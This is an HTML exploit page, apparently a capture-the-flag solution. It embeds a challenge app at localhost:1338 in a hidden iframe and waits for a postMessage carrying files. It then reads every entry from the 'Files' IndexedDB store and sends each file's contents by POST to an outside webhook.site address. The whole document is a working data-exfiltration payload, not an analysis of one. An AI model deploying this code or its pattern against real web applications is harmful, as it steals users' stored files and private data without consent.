<!DOCTYPE html>
<html>
  <body>
    <p>Loading iframe and waiting for flag...</p>

    <iframe id="challenge" src="http://localhost:1338/" style="display:none;"></iframe>

    <script>
      window.addEventListener("message", (event) => {
        if (event.data?.files?.length > 0) {
          console.log("Received postMessage with files!");

          const openRequest = indexedDB.open("Files", 1);

          openRequest.onsuccess = () => {
            const db = openRequest.result;
            const tx = db.transaction("files", "readonly");
            const store = tx.objectStore("files");

            const getAll = store.getAll();
            getAll.onsuccess = () => {
              const results = getAll.result;
              for (const entry of results) {
                const fileBlob = entry.file;

                const reader = new FileReader();
                reader.onload = function () {
                  fetch("https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df", {
                    method: "POST",
                    headers: { "Content-Type": "text/plain" },
                    body: reader.result
                  });
                };
                reader.readAsText(fileBlob);
              }
            };
          };
        }
      });
    </script>
  </body>
</html>
